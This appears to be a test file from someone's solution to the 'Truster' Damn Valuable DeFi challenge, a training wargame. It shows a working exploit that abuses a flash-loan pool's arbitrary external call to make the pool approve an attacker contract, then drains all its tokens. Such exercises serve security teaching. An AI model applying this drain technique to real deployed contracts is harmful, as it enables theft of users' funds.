const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
        const AttackerContract = await ethers.getContractFactory('TrusterAttack', attacker);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);
        this.attackerContract = await AttackerContract.deploy(this.pool.address, this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');

        console.log("attacker contract address: ", this.attackerContract.address)
    });

    it('Exploit', async function () {
        const balanceToSteal = await this.token.balanceOf(this.pool.address)
        console.log("attacker address: ", attacker.address)

        const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"])
        //impersonates truster contract to approve our attacking contract to spend the truster contract's tokens
        const data = iface.encodeFunctionData("approve", [this.attackerContract.address, balanceToSteal.toString()])

        console.log("Data: ", data)
        //eventually transfers tokens from the truster contract to the msg.sender aka attacker address
        await this.attackerContract.attack(0, attacker.address, this.token.address, data)

        //await this.attackerContract.withdraw()
        // const attackerDeploy = await this.pool.connect(attacker)
        // await attackerDeploy.flashLoan(0, attacker.address, this.pool.address, data)
        // console.log("attempting to transfer the coins out")
        // await this.token.transferFrom(this.pool.address, attacker.address, balanceToSteal.toString())

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

